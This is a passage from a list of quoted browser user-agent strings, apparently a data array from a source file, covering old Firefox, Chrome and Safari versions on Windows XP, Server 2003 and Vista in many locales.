'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/532+ (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.4) Gecko/20091007 Firefox/3.5.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.0.04506.30)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.0.04506.648)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 ( .NET CLR 3.5.30729; .NET4.0E)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 GTB7.1 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.16) Gecko/20110319 AskTbUTR/3.11.3.15590 Firefox/3.6.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.548.0 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.599.0 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.602.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.600.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.634.0 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.18',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.19',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.9 (KHTML, like Gecko) Chrome/7.0.531.0 Safari/534.9',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.11 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20101130 AskTbPLTV5/3.8.0.12304 Firefox/3.5.16 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) FBSMTWB',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB6 (.NET CLR 3.5.30729) FBSMTWB',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b4pre) Gecko/20090401 Firefox/3.5b4pre',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b4pre) Gecko/20090409 Firefox/3.5b4pre',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b5pre) Gecko/20090517 Firefox/3.5b4pre (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.1.13) Gecko/20100914 Firefox/3.6.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fa; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fi-FI) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; hu-HU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; hu; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729; .NET4.0E)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB7.0 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0E)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ko; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nb-NO) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nb-NO; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.12) Gecko/20100824 MRA 5.7 (build 03755) Firefox/3.5.12',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.7 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; uk; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 GTB6',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.0 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-CA; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.558.0 Safari/534.10',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.0 Safari/534.17',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.4) Gecko/20091007 Firefox/3.5.4',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; fr; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.0.04506.648)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.11) Gecko/20101012 Firefox/3.6.11',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.1.5) Gecko/Firefox/3.5.5',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-TW; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; bg; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB7.0 (.NET CLR 3.0.30618)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.2.13) Gecko/20101203 Firefox/3.5.9 (de)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 4.0.20506)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10 GTB7.0 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.15) Gecko/20110303 AskTbBT4/3.11.3.15590 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 ( .NET CLR 3.5.30729; .NET CLR 4.0.20506)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/533.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/7.0.521.0 Safari/534.8',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.5.12',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.16) Gecko/20101130 MRA 5.4 (build 02647) Firefox/3.5.16 ( .NET CLR 3.5.30729; .NET4.0C)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727; .NET CLR 3.0.30618; .NET CLR 3.5.21022; .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02647) Firefox/3.5.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 3.5.30729) FirePHP/0.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 GTB5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; .NET CLR 3.5.21022)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100527 Firefox/3.6.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100527 Firefox/3.6.4 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-gb) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-us) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; es-ES; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB5 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; es-MX; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; es-es) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; fi; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528+ (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; hu-HU) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; id; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 GTB7.1 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ko; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB7.1 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.2) Gecko/20100115 Firefox/3.6 ( .NET CLR 3.5.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100105 Firefox/3.6 (.NET CLR 3.5.30729)',
